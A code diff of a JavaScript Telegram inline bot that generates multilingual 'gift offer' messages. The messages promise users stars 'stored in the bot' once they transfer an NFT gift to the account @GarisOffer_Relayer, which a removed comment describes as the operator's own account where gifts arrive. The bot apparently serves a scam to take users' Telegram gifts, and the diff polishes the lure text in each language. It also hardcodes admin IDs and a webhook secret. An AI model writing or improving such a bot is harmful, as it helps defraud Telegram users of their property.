@@ -1,8 +1,6 @@
 const ADMIN_ID_1 = 5151757168; 
 const ADMIN_ID_2 = 7423713851; 
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
-
-// Твой аккаунт гаранта (куда будут приходить подарки)
 const RELAYER_USERNAME = "GarisOffer_Relayer";
 
 export default {
@@ -74,11 +72,14 @@ export default {
         
         const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
         let giftLink = "";
+        let giftDisplay = "";
         if (giftMatch && giftMatch[0]) {
             let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
             giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
+            giftDisplay = rawGift;
         } else {
             giftLink = "https://t.me/telegram"; 
+            giftDisplay = "Подарок";
         }
 
         let currencyType = "stars";
@@ -91,24 +92,24 @@ export default {
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
         const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
         
-        // УПРОЩЕННЫЙ ТЕКСТ ОФФЕРА
         let text = "";
         let btnAccept = "✅ Принять";
         let btnDecline = "❌ Отклонить";
         let titleText = "";
 
+        // ИСПРАВЛЕНО: Убрана ошибка с linkOrGift
         if (lang === "en") {
-            text = `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b>\n\n💰 ${amount} ${currencyDisplay}\n🎁 ${linkOrGift}\n\n💡 Stars are stored in the bot and will arrive automatically after the gift is transferred.`;
+            text = `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b>\n\n💰 ${amount} ${currencyDisplay}\n🎁 ${giftDisplay}\n\n💡 Stars are stored in the bot and will arrive automatically after the gift is transferred to @${RELAYER_USERNAME}.`;
             btnAccept = "✅ Accept";
             btnDecline = "❌ Decline";
             titleText = `Offer from ${senderName}`;
         } else if (lang === "cn") {
-            text = `🎁 <b>礼物报价</b>\n\n👤 <b>${senderName}</b>\n\n💰 ${amount} ${currencyDisplay}\n🎁 ${linkOrGift}\n\n💡 星星存储在机器人中，礼物转移后会自动到达。`;
+            text = `🎁 <b>礼物报价</b>\n\n👤 <b>${senderName}</b>\n\n💰 ${amount} ${currencyDisplay}\n🎁 ${giftDisplay}\n\n💡 星星存储在机器人中，礼物转移给 @${RELAYER_USERNAME} 后会自动到达。`;
             btnAccept = "✅ 接受";
             btnDecline = "❌ 拒绝";
             titleText = `来自 ${senderName} 的报价`;
         } else {
-            text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b>\n\n💰 ${amount} ${currencyDisplay} вы получите если продадите подарок.\n\n🎁 ${linkOrGift}\n\n💡 Звезды хранятся в данных бота и автоматически придут после того, как подарок передадут гаранту @${RELAYER_USERNAME}.`;
+            text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b>\n\n💰 ${amount} ${currencyDisplay} вы получите если продадите подарок.\n\n🎁 ${giftDisplay}\n\n💡 Звезды хранятся в данных бота и автоматически придут после того, как подарок передадут гаранту @${RELAYER_USERNAME}.`;
             btnAccept = "✅ Принять";
             btnDecline = "❌ Отклонить";
             titleText = `Оффер от ${senderName}`;
